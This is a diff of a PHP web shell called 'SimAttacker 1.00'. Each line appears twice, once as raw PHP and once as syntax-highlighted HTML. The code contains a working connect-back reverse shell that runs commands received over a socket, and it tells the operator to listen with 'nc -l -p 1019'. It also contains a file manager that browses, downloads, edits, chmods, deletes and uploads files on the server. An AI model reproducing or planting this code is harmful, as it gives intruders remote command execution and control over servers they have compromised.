-            For user :&lt;br&gt;
-            nc -l -p 1019 &lt;br&gt;
-            &lt;hr&gt;
-            &lt;form method='POST' action=''&gt;&lt;br&gt;
-            Your IP & BindPort:&lt;br&gt;
-            &lt;input type='text' name='mip' &gt;
-            &lt;input type='text' name='bport' size='5' value='1019'&gt;&lt;br&gt;
-            &lt;input type='submit' value='Connect Back'&gt;
-            &lt;/form&gt;";
-         $mip=$_POST['mip'];
-         $bport=$_POST['bport'];
-         if ($mip &lt;&gt; "")
-         {
-         $fp=fsockopen($mip , $bport , $errno, $errstr);
-         if (!$fp){
-               $result = "Error: could not open socket connection";
-         }
-         else {
-         fputs ($fp ,"\n*********************************************\nWelcome T0 SimAttacker 1.00  ready 2 USe\n*********************************************\n\n");
-      while(!feof($fp)){ 
-       fputs ($fp," bash # ");
-       $result= fgets ($fp, 4096);
-      $message=`$result`;
-       fputs ($fp,"--&gt; ".$message."\n");
-      }
-      fclose ($fp);
-         }
-         }
-            }
+            <span class="c1">//Connect Back -Firewall Bypass</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$id</span><span class="o">==</span><span class="s2">&quot;cshell&quot;</span><span class="p">){</span>
+            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;Connect back Shell , bypass Firewalls&amp;lt;br&amp;gt;</span>
+<span class="s2">            For user :&amp;lt;br&amp;gt;</span>
+<span class="s2">            nc -l -p 1019 &amp;lt;br&amp;gt;</span>
+<span class="s2">            &amp;lt;hr&amp;gt;</span>
+<span class="s2">            &amp;lt;form method=&#39;POST&#39; action=&#39;&#39;&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="s2">            Your IP &amp; BindPort:&amp;lt;br&amp;gt;</span>
+<span class="s2">            &amp;lt;input type=&#39;text&#39; name=&#39;mip&#39; &amp;gt;</span>
+<span class="s2">            &amp;lt;input type=&#39;text&#39; name=&#39;bport&#39; size=&#39;5&#39; value=&#39;1019&#39;&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="s2">            &amp;lt;input type=&#39;submit&#39; value=&#39;Connect Back&#39;&amp;gt;</span>
+<span class="s2">            &amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
+         <span class="nv">$mip</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mip&#39;</span><span class="p">];</span>
+         <span class="nv">$bport</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;bport&#39;</span><span class="p">];</span>
+         <span class="k">if</span> <span class="p">(</span><span class="nv">$mip</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+         <span class="p">{</span>
+         <span class="nv">$fp</span><span class="o">=</span><span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$mip</span> <span class="p">,</span> <span class="nv">$bport</span> <span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">);</span>
+         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">){</span>
+               <span class="nv">$result</span> <span class="o">=</span> <span class="s2">&quot;Error: could not open socket connection&quot;</span><span class="p">;</span>
+         <span class="p">}</span>
+         <span class="k">else</span> <span class="p">{</span>
+         <span class="nb">fputs</span> <span class="p">(</span><span class="nv">$fp</span> <span class="p">,</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">*********************************************</span><span class="se">\n</span><span class="s2">Welcome T0 SimAttacker 1.00  ready 2 USe</span><span class="se">\n</span><span class="s2">*********************************************</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">);</span>
+      <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)){</span> 
+       <span class="nb">fputs</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot; bash # &quot;</span><span class="p">);</span>
+       <span class="nv">$result</span><span class="o">=</span> <span class="nb">fgets</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>
+      <span class="nv">$message</span><span class="o">=</span><span class="sb">`$result`</span><span class="p">;</span>
+       <span class="nb">fputs</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;--&amp;gt; &quot;</span><span class="o">.</span><span class="nv">$message</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="nb">fclose</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+         <span class="p">}</span>
+         <span class="p">}</span>
+            <span class="p">}</span>
             
-        //********************************************************
-            //Spy File Manager
-            $homedir=getcwd();
-            $dir=realpath($_GET['dir'])."/";
-            if ($id=="fm"){
-            echo "&lt;br&gt;&lt;b&gt;&lt;p align='left'&gt;&nbsp;Home:&lt;/b&gt; $homedir 
-                  &nbsp;&lt;b&gt;
-                  &lt;form action='' method='GET'&gt;
-                  &nbsp;Path:&lt;/b&gt;
-                  &lt;input type='hidden' name='id' value='fm'&gt;
-                  &lt;input type='text' name='dir' size='80' value='$dir'&gt;
-                  &lt;input type='submit' value='dir'&gt;
-                  &lt;/form&gt;
-                 &lt;br&gt;";
+        <span class="c1">//********************************************************</span>
+            <span class="c1">//Spy File Manager</span>
+            <span class="nv">$homedir</span><span class="o">=</span><span class="nb">getcwd</span><span class="p">();</span>
+            <span class="nv">$dir</span><span class="o">=</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$id</span><span class="o">==</span><span class="s2">&quot;fm&quot;</span><span class="p">){</span>
+            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;&amp;lt;p align=&#39;left&#39;&amp;gt;&amp;nbsp;Home:&amp;lt;/b&amp;gt; </span><span class="si">$homedir</span><span class="s2"> </span>
+<span class="s2">                  &amp;nbsp;&amp;lt;b&amp;gt;</span>
+<span class="s2">                  &amp;lt;form action=&#39;&#39; method=&#39;GET&#39;&amp;gt;</span>
+<span class="s2">                  &amp;nbsp;Path:&amp;lt;/b&amp;gt;</span>
+<span class="s2">                  &amp;lt;input type=&#39;hidden&#39; name=&#39;id&#39; value=&#39;fm&#39;&amp;gt;</span>
+<span class="s2">                  &amp;lt;input type=&#39;text&#39; name=&#39;dir&#39; size=&#39;80&#39; value=&#39;</span><span class="si">$dir</span><span class="s2">&#39;&amp;gt;</span>
+<span class="s2">                  &amp;lt;input type=&#39;submit&#39; value=&#39;dir&#39;&amp;gt;</span>
+<span class="s2">                  &amp;lt;/form&amp;gt;</span>
+<span class="s2">                 &amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
 
-            echo "
+            <span class="k">echo</span> <span class="s2">&quot;</span>
 
-&lt;div align='center'&gt;
+<span class="s2">&amp;lt;div align=&#39;center&#39;&amp;gt;</span>
 
-&lt;table border='1' id='table1' style='border: 1px #333333' height='90' cellspacing='0' cellpadding='0'&gt;
-    &lt;tr&gt;
-        &lt;td width='300' height='30' align='left'&gt;&lt;b&gt;&lt;font size='2'&gt;File / Folder Name&lt;/font&gt;&lt;/b&gt;&lt;/td&gt;
-        &lt;td height='28' width='82' align='center'&gt;
-        &lt;font color='#000080' size='2'&gt;&lt;b&gt;Size KByte&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;
-        &lt;td height='28' width='83' align='center'&gt;
-        &lt;font color='#008000' size='2'&gt;&lt;b&gt;Download&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;
-        &lt;td height='28' width='66' align='center'&gt;
-        &lt;font color='#FF9933' size='2'&gt;&lt;b&gt;Edit&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;
-        &lt;td height='28' width='75' align='center'&gt;
-        &lt;font color='#999999' size='2'&gt;&lt;b&gt;Chmod&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;
-        &lt;td height='28' align='center'&gt;&lt;font color='#FF0000' size='2'&gt;&lt;b&gt;Delete&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;
-    &lt;/tr&gt;";
-            if (is_dir($dir)){
-            if ($dh=opendir($dir)){
-            while (($file = readdir($dh)) !== false) {
-            $fsize=round(filesize($dir . $file)/1024);
+<span class="s2">&amp;lt;table border=&#39;1&#39; id=&#39;table1&#39; style=&#39;border: 1px #333333&#39; height=&#39;90&#39; cellspacing=&#39;0&#39; cellpadding=&#39;0&#39;&amp;gt;</span>
+<span class="s2">    &amp;lt;tr&amp;gt;</span>
+<span class="s2">        &amp;lt;td width=&#39;300&#39; height=&#39;30&#39; align=&#39;left&#39;&amp;gt;&amp;lt;b&amp;gt;&amp;lt;font size=&#39;2&#39;&amp;gt;File / Folder Name&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="s2">        &amp;lt;td height=&#39;28&#39; width=&#39;82&#39; align=&#39;center&#39;&amp;gt;</span>
+<span class="s2">        &amp;lt;font color=&#39;#000080&#39; size=&#39;2&#39;&amp;gt;&amp;lt;b&amp;gt;Size KByte&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="s2">        &amp;lt;td height=&#39;28&#39; width=&#39;83&#39; align=&#39;center&#39;&amp;gt;</span>
+<span class="s2">        &amp;lt;font color=&#39;#008000&#39; size=&#39;2&#39;&amp;gt;&amp;lt;b&amp;gt;Download&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="s2">        &amp;lt;td height=&#39;28&#39; width=&#39;66&#39; align=&#39;center&#39;&amp;gt;</span>
+<span class="s2">        &amp;lt;font color=&#39;#FF9933&#39; size=&#39;2&#39;&amp;gt;&amp;lt;b&amp;gt;Edit&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="s2">        &amp;lt;td height=&#39;28&#39; width=&#39;75&#39; align=&#39;center&#39;&amp;gt;</span>
+<span class="s2">        &amp;lt;font color=&#39;#999999&#39; size=&#39;2&#39;&amp;gt;&amp;lt;b&amp;gt;Chmod&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="s2">        &amp;lt;td height=&#39;28&#39; align=&#39;center&#39;&amp;gt;&amp;lt;font color=&#39;#FF0000&#39; size=&#39;2&#39;&amp;gt;&amp;lt;b&amp;gt;Delete&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="s2">    &amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)){</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$dh</span><span class="o">=</span><span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)){</span>
+            <span class="k">while</span> <span class="p">((</span><span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$fsize</span><span class="o">=</span><span class="nb">round</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">)</span><span class="o">/</span><span class="mi">1024</span><span class="p">);</span>
         
             
-    echo " 
-    &lt;tr&gt;
-        &lt;th width='250' height='22' align='left' nowrap&gt;";
-        if (is_dir($dir.$file))
-        {
-        echo "&lt;a href='?id=fm&dir=$dir$file'&gt;&lt;span style='text-decoration: none'&gt;&lt;font size='2' color='#666666'&gt;&nbsp;$file &lt;font color='#FF0000' size='1'&gt;dir&lt;/font&gt;";
-        }
-        else {
-        echo "&lt;font size='2' color='#666666'&gt;&nbsp;$file ";
-        }
-        echo "&lt;/a&gt;&lt;/font&gt;&lt;/th&gt;
-        &lt;td width='113' align='center' nowrap&gt;&lt;font color='#000080' size='2'&gt;&lt;b&gt;";
-        if (is_file($dir.$file))
-        {
-        echo "$fsize";
-        }
-        else {
-        echo "&nbsp; ";
-        }
-        echo "
-        &lt;/b&gt;&lt;/font&gt;&lt;/td&gt;
-        &lt;td width='103' align='center' nowrap&gt;";
-        if (is_file($dir.$file)){
-        if (is_readable($dir.$file)){
-        echo "&lt;a href='?id=fm&fdownload=$dir$file'&gt;&lt;span style='text-decoration: none'&gt;&lt;font size='2' color='#008000'&gt;download";
-        }else {
-        echo "&lt;font size='1' color='#FF0000'&gt;&lt;b&gt;No ReadAble&lt;/b&gt;";
-         }
-        }else {
-        echo "&nbsp;";
-         }
-        echo "
-        &lt;/a&gt;&lt;/font&gt;&lt;/td&gt;
-        &lt;td width='77' align='center' nowrap&gt;";
-        if (is_file($dir.$file))
-        {
-        if (is_readable($dir.$file)){
-        echo "&lt;a target='_blank' href='?id=fm&fedit=$dir$file'&gt;&lt;span style='text-decoration: none'&gt;&lt;font color='#FF9933' size='2'&gt;Edit";
-        }else {
-        echo "&lt;font size='1' color='#FF0000'&gt;&lt;b&gt;No ReadAble&lt;/b&gt;";
-         }
-        }else {
-        echo "&nbsp;";
-         }
-        echo "
-        &lt;/a&gt;&lt;/font&gt;&lt;/td&gt;
-        &lt;td width='86' align='center' nowrap&gt;";
-        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-        echo "&lt;font size='1' color='#999999'&gt;Dont in windows";
-        }
-        else {
-        echo "&lt;a href='?id=fm&fchmod=$dir$file'&gt;&lt;span style='text-decoration: none'&gt;&lt;font size='2' color='#999999'&gt;Chmod";
-        }
-        echo "&lt;/a&gt;&lt;/font&gt;&lt;/td&gt;
-        &lt;td width='86'align='center' nowrap&gt;&lt;a href='?id=fm&fdelete=$dir$file'&gt;&lt;span style='text-decoration: none'&gt;&lt;font size='2' color='#FF0000'&gt;Delete&lt;/a&gt;&lt;/font&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    ";
-              }
-              closedir($dh);
-            } 
-            }
-            echo "&lt;/table&gt;
-&lt;form enctype='multipart/form-data' action='' method='POST'&gt;
- &lt;input type='hidden' name='MAX_FILE_SIZE' value='300000' /&gt;
- Send this file: &lt;input name='userfile' type='file' /&gt;
- &lt;inpt type='hidden' name='Fupath'  value='$dir'&gt;
- &lt;input type='submit' value='Send File' /&gt;
-&lt;/form&gt; 
-            &lt;/div&gt;";
-            }
-//Upload Files 
-$rpath=$_GET['dir'];
-if ($rpath &lt;&gt; "") {
-$uploadfile = $rpath."/" . $_FILES['userfile']['name'];
-print "&lt;pre&gt;";
-if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
-echo "&lt;script language='javascript'&gt; alert('\:D Successfully uploaded.!')&lt;/script&gt;";
-echo "&lt;script language='javascript'&gt; history.back(2)&lt;/script&gt;";
-}
- }
- //file deleted
-$frpath=$_GET['fdelete'];
-if ($frpath &lt;&gt; "") {
-if (is_dir($frpath)){
-$matches = glob($frpath . '/*.*');
-if ( is_array ( $matches ) ) {
-  foreach ( $matches as $filename) {
-  unlink ($filename);
-  rmdir("$frpath");
-echo "&lt;script language='javascript'&gt; alert('Success! Please refresh')&lt;/script&gt;";
-echo "&lt;script language='javascript'&gt; history.back(1)&lt;/script&gt;";
-  }
-  }
-  }
-  else{
-echo "&lt;script language='javascript'&gt; alert('Success! Please refresh')&lt;/script&gt;";
-unlink ("$frpath");
-echo "&lt;script language='javascript'&gt; history.back(1)&lt;/script&gt;";
-exit(0);
+    <span class="k">echo</span> <span class="s2">&quot; </span>
+<span class="s2">    &amp;lt;tr&amp;gt;</span>
+<span class="s2">        &amp;lt;th width=&#39;250&#39; height=&#39;22&#39; align=&#39;left&#39; nowrap&amp;gt;&quot;</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dir</span><span class="o">.</span><span class="nv">$file</span><span class="p">))</span>
+        <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=&#39;?id=fm&amp;dir=</span><span class="si">$dir$file</span><span class="s2">&#39;&amp;gt;&amp;lt;span style=&#39;text-decoration: none&#39;&amp;gt;&amp;lt;font size=&#39;2&#39; color=&#39;#666666&#39;&amp;gt;&amp;nbsp;</span><span class="si">$file</span><span class="s2"> &amp;lt;font color=&#39;#FF0000&#39; size=&#39;1&#39;&amp;gt;dir&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;font size=&#39;2&#39; color=&#39;#666666&#39;&amp;gt;&amp;nbsp;</span><span class="si">$file</span><span class="s2"> &quot;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/th&amp;gt;</span>
+<span class="s2">        &amp;lt;td width=&#39;113&#39; align=&#39;center&#39; nowrap&amp;gt;&amp;lt;font color=&#39;#000080&#39; size=&#39;2&#39;&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$dir</span><span class="o">.</span><span class="nv">$file</span><span class="p">))</span>
+        <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;</span><span class="si">$fsize</span><span class="s2">&quot;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;nbsp; &quot;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">echo</span> <span class="s2">&quot;</span>
+<span class="s2">        &amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="s2">        &amp;lt;td width=&#39;103&#39; align=&#39;center&#39; nowrap&amp;gt;&quot;</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$dir</span><span class="o">.</span><span class="nv">$file</span><span class="p">)){</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$dir</span><span class="o">.</span><span class="nv">$file</span><span class="p">)){</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=&#39;?id=fm&amp;fdownload=</span><span class="si">$dir$file</span><span class="s2">&#39;&amp;gt;&amp;lt;span style=&#39;text-decoration: none&#39;&amp;gt;&amp;lt;font size=&#39;2&#39; color=&#39;#008000&#39;&amp;gt;download&quot;</span><span class="p">;</span>
+        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;font size=&#39;1&#39; color=&#39;#FF0000&#39;&amp;gt;&amp;lt;b&amp;gt;No ReadAble&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
+         <span class="p">}</span>
+        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;nbsp;&quot;</span><span class="p">;</span>
+         <span class="p">}</span>
+        <span class="k">echo</span> <span class="s2">&quot;</span>
+<span class="s2">        &amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="s2">        &amp;lt;td width=&#39;77&#39; align=&#39;center&#39; nowrap&amp;gt;&quot;</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$dir</span><span class="o">.</span><span class="nv">$file</span><span class="p">))</span>
+        <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$dir</span><span class="o">.</span><span class="nv">$file</span><span class="p">)){</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a target=&#39;_blank&#39; href=&#39;?id=fm&amp;fedit=</span><span class="si">$dir$file</span><span class="s2">&#39;&amp;gt;&amp;lt;span style=&#39;text-decoration: none&#39;&amp;gt;&amp;lt;font color=&#39;#FF9933&#39; size=&#39;2&#39;&amp;gt;Edit&quot;</span><span class="p">;</span>
+        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;font size=&#39;1&#39; color=&#39;#FF0000&#39;&amp;gt;&amp;lt;b&amp;gt;No ReadAble&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
+         <span class="p">}</span>
+        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;nbsp;&quot;</span><span class="p">;</span>
+         <span class="p">}</span>
+        <span class="k">echo</span> <span class="s2">&quot;</span>
+<span class="s2">        &amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="s2">        &amp;lt;td width=&#39;86&#39; align=&#39;center&#39; nowrap&amp;gt;&quot;</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">strtoupper</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">))</span> <span class="o">===</span> <span class="s1">&#39;WIN&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;font size=&#39;1&#39; color=&#39;#999999&#39;&amp;gt;Dont in windows&quot;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=&#39;?id=fm&amp;fchmod=</span><span class="si">$dir$file</span><span class="s2">&#39;&amp;gt;&amp;lt;span style=&#39;text-decoration: none&#39;&amp;gt;&amp;lt;font size=&#39;2&#39; color=&#39;#999999&#39;&amp;gt;Chmod&quot;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="s2">        &amp;lt;td width=&#39;86&#39;align=&#39;center&#39; nowrap&amp;gt;&amp;lt;a href=&#39;?id=fm&amp;fdelete=</span><span class="si">$dir$file</span><span class="s2">&#39;&amp;gt;&amp;lt;span style=&#39;text-decoration: none&#39;&amp;gt;&amp;lt;font size=&#39;2&#39; color=&#39;#FF0000&#39;&amp;gt;Delete&amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="s2">    &amp;lt;/tr&amp;gt;</span>
+<span class="s2">    &quot;</span><span class="p">;</span>
+              <span class="p">}</span>
+              <span class="nb">closedir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">);</span>
+            <span class="p">}</span> 
+            <span class="p">}</span>
+            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;</span>
+<span class="s2">&amp;lt;form enctype=&#39;multipart/form-data&#39; action=&#39;&#39; method=&#39;POST&#39;&amp;gt;</span>
+<span class="s2"> &amp;lt;input type=&#39;hidden&#39; name=&#39;MAX_FILE_SIZE&#39; value=&#39;300000&#39; /&amp;gt;</span>
+<span class="s2"> Send this file: &amp;lt;input name=&#39;userfile&#39; type=&#39;file&#39; /&amp;gt;</span>
+<span class="s2"> &amp;lt;inpt type=&#39;hidden&#39; name=&#39;Fupath&#39;  value=&#39;</span><span class="si">$dir</span><span class="s2">&#39;&amp;gt;</span>
+<span class="s2"> &amp;lt;input type=&#39;submit&#39; value=&#39;Send File&#39; /&amp;gt;</span>
+<span class="s2">&amp;lt;/form&amp;gt; </span>
+<span class="s2">            &amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
+            <span class="p">}</span>
+<span class="c1">//Upload Files </span>
+<span class="nv">$rpath</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">];</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$rpath</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
+<span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$rpath</span><span class="o">.</span><span class="s2">&quot;/&quot;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;userfile&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+<span class="k">print</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;userfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile</span><span class="p">))</span> <span class="p">{</span>
+<span class="k">echo</span> <span class="s2">&quot;&amp;lt;script language=&#39;javascript&#39;&amp;gt; alert(&#39;\:D Successfully uploaded.!&#39;)&amp;lt;/script&amp;gt;&quot;</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">&quot;&amp;lt;script language=&#39;javascript&#39;&amp;gt; history.back(2)&amp;lt;/script&amp;gt;&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+ <span class="p">}</span>
+ <span class="c1">//file deleted</span>
+<span class="nv">$frpath</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fdelete&#39;</span><span class="p">];</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$frpath</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$frpath</span><span class="p">)){</span>
+<span class="nv">$matches</span> <span class="o">=</span> <span class="nb">glob</span><span class="p">(</span><span class="nv">$frpath</span> <span class="o">.</span> <span class="s1">&#39;/*.*&#39;</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span> <span class="nb">is_array</span> <span class="p">(</span> <span class="nv">$matches</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+  <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$matches</span> <span class="k">as</span> <span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nb">unlink</span> <span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+  <span class="nb">rmdir</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$frpath</span><span class="s2">&quot;</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">&quot;&amp;lt;script language=&#39;javascript&#39;&amp;gt; alert(&#39;Success! Please refresh&#39;)&amp;lt;/script&amp;gt;&quot;</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">&quot;&amp;lt;script language=&#39;javascript&#39;&amp;gt; history.back(1)&amp;lt;/script&amp;gt;&quot;</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span><span class="p">{</span>
+<span class="k">echo</span> <span class="s2">&quot;&amp;lt;script language=&#39;javascript&#39;&amp;gt; alert(&#39;Success! Please refresh&#39;)&amp;lt;/script&amp;gt;&quot;</span><span class="p">;</span>
+<span class="nb">unlink</span> <span class="p">(</span><span class="s2">&quot;</span><span class="si">$frpath</span><span class="s2">&quot;</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">&quot;&amp;lt;script language=&#39;javascript&#39;&amp;gt; history.back(1)&amp;lt;/script&amp;gt;&quot;</span><span class="p">;</span>
+<span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 
-  }
+  <span class="p">}</span>
   
 
-}
-            ?&gt;
-            
-            &lt;/td&gt;
-        &lt;/tr&gt;
-        &lt;tr&gt;
-            &lt;td style="border: 1px dotted #FFCC66"&gt;
-            &lt;p align="center"&gt;&lt;font color="#666666" size="1" face="Tahoma"&gt;&lt;br&gt;
-            Copyright 2004-Simorgh Security&lt;br&gt;
-            Hossein-Asgari&lt;br&gt;
-            &lt;/font&gt;&lt;font color="#c0c0c0" size="1" face="Tahoma"&gt;
-        &lt;a style="TEXT-DECORATION: none" href="http://www.simorgh-ev.com"&gt;
-        &lt;font color="#666666"&gt;www.simorgh-ev.com&lt;/font&gt;&lt;/a&gt;&lt;/font&gt;&lt;/td&gt;
-        &lt;/tr&gt;
-    &lt;/table&gt;
-&lt;/div&gt;
+<span class="p">}</span>
+            <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">            </span>
+<span class="x">            &amp;lt;/td&amp;gt;</span>
+<span class="x">        &amp;lt;/tr&amp;gt;</span>
+<span class="x">        &amp;lt;tr&amp;gt;</span>
+<span class="x">            &amp;lt;td style=&quot;border: 1px dotted #FFCC66&quot;&amp;gt;</span>
